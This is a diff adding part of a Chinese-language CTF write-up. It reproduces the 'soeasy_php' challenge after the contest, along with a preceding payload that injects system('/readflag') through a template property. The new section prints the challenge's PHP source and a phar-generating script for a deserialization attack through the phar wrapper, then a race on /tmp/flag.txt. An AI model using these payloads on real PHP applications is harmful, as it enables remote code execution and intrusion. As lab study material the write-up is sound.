@@ -94,6 +94,113 @@ post： properties[template]={TableBody}&properties[data]=1&properties[rowHtmlOp
 get：?action=TestView 
 
 POST： properties[template]={TableBody}&properties[data]=1&properties[rowHtmlOptionsExpression]=system('/readflag')
+### soeasy_php
+这题做的我好烦——————赛后复现
+
+打开这个环境
+
+![image-20220429151926810](/upload/img/image-20220429151926810.png)
+
+一个头像，然后就是一个文件上传，我们先尝试长传一个头像
+
+![image-20220429153602915](/upload/img/image-20220429153602915.png)
+
+![image-20220429153617570](/upload/img/image-20220429153617570.png)
+
+会发现这里会将文件名被改成png，且从重名，感觉像是时间戳。。这个不重要，我们查看源码
+
+![image-20220429153959905](/upload/img/image-20220429153959905.png)
+
+可以发现还有一个edit.php,而且被注释掉了，更改头像那么头像会显示到页面上，将1.png改成
+
+![image-20220429154557158](/upload/img/image-20220429154557158.png)
+
+改完后刷新页面
+
+![image-20220429155818862](/upload/img/image-20220429155818862.png)
+
+去访问uploads/head.png下载下来这个页面，将文件名后缀改成php
+
+```php
+<?php
+ini_set("error_reporting","0");
+class flag{
+    public function copyflag(){
+        exec("/copyflag"); 
+        echo "SFTQL";
+    }
+    public function __destruct(){
+        $this->copyflag();
+    }
+
+}
+
+function filewrite($file,$data){
+        unlink($file);
+        file_put_contents($file, $data);
+}
+
+
+if(isset($_POST['png'])){
+    $filename = $_POST['png'];
+    if(!preg_match("/:|phar|\/\/|php/im",$filename)){
+        $f = fopen($filename,"r");
+        $contents = fread($f, filesize($filename));
+        if(strpos($contents,"flag{") !== false){
+            filewrite($filename,"Don't give me flag!!!");
+        }
+    }
+
+    if(isset($_POST['flag'])) {
+        $flag = (string)$_POST['flag'];
+        if ($flag == "Give me flag") {
+            filewrite("/tmp/flag.txt", "Don't give me flag");
+            sleep(2);
+            die("no no no !");
+        } else {
+            filewrite("/tmp/flag.txt", $flag); 
+        }
+        $head = "uploads/head.png";
+        unlink($head);
+        if (symlink($filename, $head)) {
+            echo "æåæ´æ¢å¤´å";
+        } else {
+            unlink($filename);
+            echo "éæ­£å¸¸æä»¶ï¼å·²è¢«å é¤";
+        };
+    }
+}
+
+```
+
+首先定义了一个flag类，通过 exec("/copyflag"); 执行将/flag复制给/tmp/flag.txt，当flag类被销毁时会自动调用魔术方法__destruct去调用copyflag方法，尝试使用phar伪协议，上传一个phar文件
+
+```php
+<?php
+class flag{}//根据题目给的类更改
+$flag=new flag();
+@unlink("phar.phar");
+$p = new Phar('phar.phar');
+$p->startBuffering();
+$p->setStub('<?php __HALT_COMPILER(); ?>');
+$p->setMetadata($flag);
+$p->addFromString('1.txt','text');
+$p->stopBuffering();
+?>
+```
+
+长传生成的文件
+
+![image-20220429163051114](/upload/img/image-20220429163051114.png)
+
+然后开始tmp/flag.txt进行条件竞争
+
+![image-20220429163037598](/upload/img/image-20220429163037598.png)
+
+访问upload/head.png
+
+![image-20220429163354612](/upload/img/image-20220429163354612.png)
+
 
 ## PWN
 ### good_luck
